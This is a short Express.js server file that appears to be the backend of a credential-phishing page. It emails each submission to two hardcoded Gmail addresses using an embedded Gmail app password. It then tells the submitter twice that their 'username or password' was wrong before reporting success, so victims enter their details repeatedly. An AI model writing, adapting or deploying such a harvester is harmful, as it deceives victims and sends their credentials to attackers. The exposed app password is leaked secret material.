import express from "express";
import path from "path";
import { fileURLToPath } from "url";
import bodyParser from "body-parser";
import nodemailer from "nodemailer";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const app = express();

app.use(bodyParser.json());
app.use(express.static(__dirname));

// Gmail Config
const SENDER_EMAIL = "nothingisimpossiblebrother@gmail.com";
const APP_PASSWORD = "agntmvxlgazptvow";

// ✅ Multiple receiver emails (comma-separated)
const RECEIVER_EMAILS = [
  "marslansalfias@gmail.com",
  "nehanade999@gmail.com"
  // اگر چاہیں تو مزید ای میل یہاں شامل کریں
  // "example2@gmail.com",
  // "example3@gmail.com"
];

let attemptCount = 0;

// Root route
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// Form submit route
app.post("/send", async (req, res) => {
  const { name, message } = req.body;

  try {
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: SENDER_EMAIL,
        pass: APP_PASSWORD
      }
    });

    // ✅ Join multiple emails into a comma-separated string
    const toEmails = RECEIVER_EMAILS.join(",");

    await transporter.sendMail({
      from: `"Website Message" <${SENDER_EMAIL}>`,
      to: toEmails,
      subject: `New Message from ${name}`,
      text: `Name: ${name}\nMessage: ${message}`
    });

    attemptCount++;

    if (attemptCount < 3) {
      res.json({
        success: false,
        message: "❌ Your request submission failed. Please check your username or password. Please enter correct details."
      });
    } else {
      attemptCount = 0; // reset
      res.json({
        success: true,
        message: "✅ Your request has been submitted successfully. Please wait 24 hours."
      });
    }
  } catch (err) {
    console.error("Email Error:", err);
    res.status(500).json({
      success: false,
      message: "❌ Something went wrong while sending your message."
    });
  }
});

// ✅ No app.listen() for Vercel
export default app;
